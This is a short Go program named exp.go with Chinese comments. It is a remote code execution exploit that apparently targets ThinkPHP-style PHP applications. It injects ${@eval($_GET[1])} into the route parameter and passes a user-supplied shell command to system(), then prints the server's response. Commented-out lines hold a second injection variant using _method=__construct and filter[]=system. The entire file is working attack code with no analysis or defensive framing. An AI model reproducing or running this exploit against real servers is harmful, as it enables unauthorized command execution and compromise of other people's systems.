package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
)

func main() {
	// 获取外部参数
	args := os.Args[1:]
	if len(args) != 2 {
		fmt.Println("Usage: go run exp.go <url> <command>")
		return
	}

	// 构造请求参数
	u, err := url.Parse(args[0] + "/index.php?s=/a/b/c/${@eval($_GET[1])}&1=system(%27" + args[1] + "%27);")
	if err != nil {
		fmt.Println("Error: invalid url")
		return
	}
	//q := u.Query()
	//q.Set("_method", "__construct")
	//q.Set("filter[]", "system")
	//q.Set("method", args[1])
	//u.RawQuery = q.Encode()

	// 发送请求
	resp, err := http.Get(u.String())
	if err != nil {
		fmt.Println("Error: request failed")
		return
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error: response failed")
		return
	}
	fmt.Println(string(body))
}
